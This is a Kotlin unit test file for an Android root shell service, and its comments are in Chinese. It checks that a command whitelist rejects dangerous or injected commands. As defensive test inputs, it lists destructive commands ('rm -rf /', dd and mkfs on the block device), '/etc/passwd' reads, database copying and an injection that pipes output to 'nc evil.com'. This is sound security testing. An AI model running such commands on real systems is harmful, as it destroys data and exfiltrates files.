package com.apk.claw.android.root

import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * RootShellService 安全逻辑单测 —— 验证命令白名单 + 注入检测。
 *
 * 不测实际 su 执行(需 Root 设备),只测 [RootShellService.isCommandAllowed] 的安全边界。
 * 用反射访问 private 方法,避免为测试暴露 API。
 */
class RootShellServiceTest {

    /** 通过反射调用 private isCommandAllowed(保证测试真实实现而非副本)。 */
    private fun isAllowed(command: String): Boolean {
        val method = RootShellService.javaClass.getDeclaredMethod("isCommandAllowed", String::class.java)
        method.isAccessible = true
        return method.invoke(RootShellService, command) as Boolean
    }

    @Test
    fun `白名单内的命令被允许`() {
        assertTrue(isAllowed("dumpsys SurfaceFlinger"))
        assertTrue(isAllowed("dumpsys display"))
        assertTrue(isAllowed("settings get system screen_off_timeout"))
        assertTrue(isAllowed("getprop ro.product.model"))
        assertTrue(isAllowed("screencap -p /sdcard/test.png"))
        assertTrue(isAllowed("am start com.example.app"))
        assertTrue(isAllowed("wm size 1080x1920"))
    }

    @Test
    fun `白名单外的命令被拒绝`() {
        assertFalse(isAllowed("rm -rf /"))
        assertFalse(isAllowed("dd if=/dev/zero of=/dev/block/mmcblk0"))
        assertFalse(isAllowed("iptables -F"))
        assertFalse(isAllowed("reboot"))
        assertFalse(isAllowed("shutdown -h now"))
        assertFalse(isAllowed("mkfs.ext4 /dev/block/mmcblk0"))
        assertFalse(isAllowed("pm uninstall com.example.app"))
        assertFalse(isAllowed("cp /data/data/com.example/databases.db /sdcard/"))
    }

    @Test
    fun `shell 元字符注入被拒绝`() {
        // 即使前缀在白名单内,含元字符也拒绝
        assertFalse(isAllowed("dumpsys SurfaceFlinger; rm -rf /"))
        assertFalse(isAllowed("dumpsys SurfaceFlinger | nc evil.com 1234"))
        assertFalse(isAllowed("dumpsys SurfaceFlinger && cat /etc/passwd"))
        assertFalse(isAllowed("dumpsys SurfaceFlinger \$(rm -rf /)"))
        assertFalse(isAllowed("dumpsys SurfaceFlinger `rm -rf /`"))
        assertFalse(isAllowed("dumpsys SurfaceFlinger; echo hacked"))
        assertFalse(isAllowed("settings get system screen_off_timeout; rm /sdcard/test"))
    }

    @Test
    fun `前缀欺骗被拒绝`() {
        // 不能用类似前缀绕过
        assertFalse(isAllowed("dumpsys SurfaceFlinger_evil"))
        assertFalse(isAllowed("settings getx system"))
        assertFalse(isAllowed("am startx com.example"))
        assertFalse(isAllowed("getpropx ro.product"))
    }

    @Test
    fun `setprop 仅允许 persist 前缀`() {
        // setprop persist.* 允许(持久化属性)
        assertTrue(isAllowed("setprop persist.debug.flag 1"))
        // setprop 非 persist 前缀拒绝(防止修改运行时系统属性如 ro.*)
        assertFalse(isAllowed("setprop ro.product.model Fake"))
        assertFalse(isAllowed("setprop sys.shutdown.timeout 0"))
    }

    @Test
    fun `空命令和纯空白被拒绝`() {
        assertFalse(isAllowed(""))
        assertFalse(isAllowed("   "))
        assertFalse(isAllowed("\t"))
    }
}
